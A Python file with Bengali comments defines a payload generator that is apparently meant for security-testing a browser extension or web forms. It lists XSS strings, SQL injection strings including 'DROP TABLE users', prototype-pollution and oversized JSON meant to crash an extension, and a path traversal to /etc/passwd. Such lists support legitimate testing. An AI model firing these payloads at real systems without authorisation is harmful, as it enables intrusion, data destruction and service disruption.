import json

class PayloadGenerator:
    def __init__(self):
        """পেলোড জেনারেটর ইনিশিয়ালাইজ করা"""
        pass

    @staticmethod
    def get_xss_payloads():
        """Cross-Site Scripting (XSS) চেক করার জন্য বেসিক এবং অ্যাডভান্সড পেলোড"""
        return [
            "<script>alert('XSS_TEST')</script>",
            "\"><script>alert('XSS_TEST')</script>",
            "<img src=x onerror=alert('XSS_TEST')>",
            "javascript:alert('XSS_TEST')",
            "<svg onload=alert('XSS_TEST')>",
            "'-alert('XSS_TEST')-'"
        ]

    @staticmethod
    def get_sql_payloads():
        """ডাটাবেস বা লোকাল স্টোরেজ (Web SQL/IndexedDB) ম্যানিপুলেট করার পেলোড"""
        return [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "admin' --",
            "' UNION SELECT NULL, NULL --",
            "1; DROP TABLE users--"
        ]

    @staticmethod
    def get_malicious_json():
        """মেসেজ পাসিং (postMessage) এর মাধ্যমে এক্সটেনশন ক্র্যাশ করানোর জন্য JSON পেলোড"""
        payloads = [
            # প্রোটোটাইপ পলিউশন (Prototype Pollution) পেলোড
            '{"__proto__": {"vulnerable": "yes"}}',
            '{"constructor": {"prototype": {"vulnerable": "yes"}}}',

            # খুব বড় বা নেস্টেড JSON (Buffer Overflow বা DoS এর জন্য)
            json.dumps({"data": "A" * 10000}),
            json.dumps({"nested": {"nested": {"nested": "value"}}}),

            # ইনভ্যালিড টাইপ
            '{"action": 12345}',
            '{"action": null}'
        ]
        return payloads

    @staticmethod
    def get_fuzzing_strings():
        """ইনপুট ফিল্ড বা ফর্মে পাঠানোর জন্য রেন্ডম এবং অপ্রত্যাশিত স্ট্রিং"""
        return [
            "A" * 5000,                  # অনেক বড় স্ট্রিং
            "../../../etc/passwd",       # ডিরেক্টরি ট্রাভার্সাল (Directory Traversal)
            "%00",                       # নাল বাইট (Null Byte)
            "& % # @ ! * ( ) { } [ ]",   # স্পেশাল ক্যারেক্টার
            "🤡💩👻💀👽"                  # ইমোজি বা ইউনিকোড ক্যারেক্টার
        ]